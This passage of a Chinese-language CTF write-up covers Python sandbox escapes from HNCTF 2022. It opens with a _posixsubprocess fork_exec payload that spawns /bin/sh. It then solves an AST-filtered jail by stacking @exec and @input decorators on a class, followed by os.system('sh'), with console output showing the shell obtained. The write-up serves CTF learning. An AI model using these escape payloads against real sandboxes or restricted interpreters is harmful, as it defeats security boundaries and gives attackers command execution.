[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), _posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)] 
```
## [HNCTF 2022 WEEK3]calc_jail_beginner_level7(JAIL)
可见这道题是根据python抽象语法树（AST）来拦截输入的。
```
=================================================================================================
==           Welcome to the calc jail beginner level7,It's AST challenge                       ==
==           Menu list:                                                                        ==
==             [G]et the blacklist AST                                                         ==
==             [E]xecute the python code                                                       ==
==             [Q]uit jail challenge                                                           ==
=================================================================================================
E
Pls input your code: (last line must contain only --HNCTF)
1+1
--HNCTF
ERROR: Banned statement <ast.Expr object at 0x7fdc0447f6d0>
Press any key to continue
```
试着输入1+1发现ban了expr
不能`import`，不能定义函数，也不能用lambda表达式，但是可以执行多行代码。这个时候，我想到了类的定义。
```
E
Pls input your code: (last line must contain only --HNCTF)
@exec
@input
class X: pass
--HNCTF
check is passed!now the result is:
<class '__main__.X'>__import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ ls
```
这样就可以得到shell。

## 参考文章
沙箱逃逸
https://blog.csdn.net/uuzeray/article/details/138138254
https://www.cnblogs.com/mumuhhh/p/17811377.html
https://zhuanlan.zhihu.com/p/579183067